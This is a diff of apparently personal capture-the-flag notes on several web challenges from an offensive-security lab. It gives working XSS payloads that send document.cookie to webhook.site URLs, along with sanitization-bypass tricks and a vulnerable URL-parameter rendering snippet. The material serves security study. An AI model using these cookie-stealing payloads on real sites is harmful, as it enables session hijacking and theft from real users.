@@ -1,20 +1,53 @@
 [NONNA RECIPES]
-1) <img src"1" onerror=fetch( "https://webhook.site/ce3ad957-cf4e-4cca-a5c8-f4478f521d28?c="+dpcument.cookie)\>
-2) then the link returned on the url bar (https://195a4f91-a794-43d8-a42d-dd23809180f6.offsec.m0lecon.it/?q=%3Cimg+src%3Dx+onerror%3Dfetch%28%22https%3A%2F%2Fwebhook.site%2F20306ec0-6134-4f4d-ba34-ae049c7db64c%3Fc%3D%22%2Bdocument.cookie%29%3E) is sended to the "share with nonna section"
-3) check on webhook the incoming "messages" and take the flag
+The vulnerability here is that the input in the search bar is considered "trusted" (and renderd in an encoded way in the URL bar),
+ so here we can type our exploit, then we can copy the url (that embed the exploit) and 
+we can take the "new" url and copy it into the "report section" of the site, which visit the webooh page (with admin priviledge)
+and retrive the cookie
+
+
+1) Type into the search bar <img src="1" onerror="fetch('https://webhook.site/ac241faa-86cc-495c-8dc0-ccca6dec6b37?c=' + document.cookie)">
+2) then the link returned on the url bar  is sended to the "share with nonna section" (https://195a4f91-a794-43d8-a42d-dd23809180f6.offsec.m0lecon.it/?q=%3Cimg+src%3Dx+onerror%3Dfetch%28%22https%3A%2F%2Fwebhook.site%2F20306ec0-6134-4f4d-ba34-ae049c7db64c%3Fc%3D%22%2Bdocument.cookie%29%3E)
+3) check on webhook the incoming "messages" and take the flag encoded as a url.
+
+"""
+
+function checkUrlAndRender() {
+    const params = new URLSearchParams(window.location.search);
+    const q = params.get('q');  <--- HERE WE CAN INSERT A ARBITRARY CODE that will be trated as HTML 
+    if (q) {
+      document.getElementById('search-input').value = q;
+      performSearch(q);
+    } else {
+      renderRecipes(allRecipes);
+    }
+  }
+"""
 #------------------------------------------------------------------------------#
 
-[PHP NOTES]
-0)use  ` (backtick) to escape to the sanitization
+[ScratchPad]
+The problem is that the message section of the note are interpreted as HTML (.innerHTML)
+The idea is to create a malicious note, and then report the link of that note in the "report section"
+in this way the the server start to analyze the note and to execute the malicious code,
+So the server will be redirected to webook url (embedding the document.cookie) 
+
+0)use  ` (backtick) to escape server to the sanitization
 1)</script><script>fetch(`https://webhook.site/ce3ad957-cf4e-4cca-a5c8-f4478f521d28?c=`+document.cookie)</script>
-2)https://76e91b99-4e19-4d47-89b3-196ee049cb5e.offsec.m0lecon.it/view.php?id=10
+2)Copy the link of the malicious note, and paste it into "report section"
+https://76e91b99-4e19-4d47-89b3-196ee049cb5e.offsec.m0lecon.it/view.php?id=10
 3)see on webhook
 #------------------------------------------------------------------------------#
 
 [GUESTBOOK]
+ The key things here is that the data.message are treated as HTML so everything will be executed by the browser,
+To do it we can exploit the WEAK SANITIZATION in order tho perform an XSS, in fact we can use the backtick (`) to replace (").
+ The idea is so insert a crafted input in order to trigger the sanitization regex that seems the most weakest (javascript:)
+ so at the end the obtain error.
+and <img src=1 onjavascript:error=fetch(`https://webhook.site/3f082e4a-3b00-4328-9b0d-e0f638e44cd9?c=`document.cookie)
 
 0)use  ` (backtick) to escape to the sanitization of "
-0)use javascript on the "onerro"
+0)use onjavascripterror --> onerror on the "onerro"
+
+1)send the input <img src=1 onjavascript:error=fetch(`https://webhook.site/3f082e4a-3b00-4328-9b0d-e0f638e44cd9?c=`document.cookie)
 #------------------------------------------------------------------------------#
 
 
@@ -29,10 +62,6 @@ So we can craft a webpage that contains the payload ( https://s337251.github.io/
 	("https://webhook.site/8ed59213-f222-49d8-929a-c06099b36de1?c=" + document.cookie)
 4) In webook websit we can se the cookie(flag)
 
-
-
-
-https://webhook.site/3f082e4a-3b00-4328-9b0d-e0f638e44cd9?c=flag=offsec{p0stm3ssag3_n0_0r1g1n_6my7QlhFjgu5xMsV}
 
 #------------------------------------------------------------------------------#
 [PicShare]
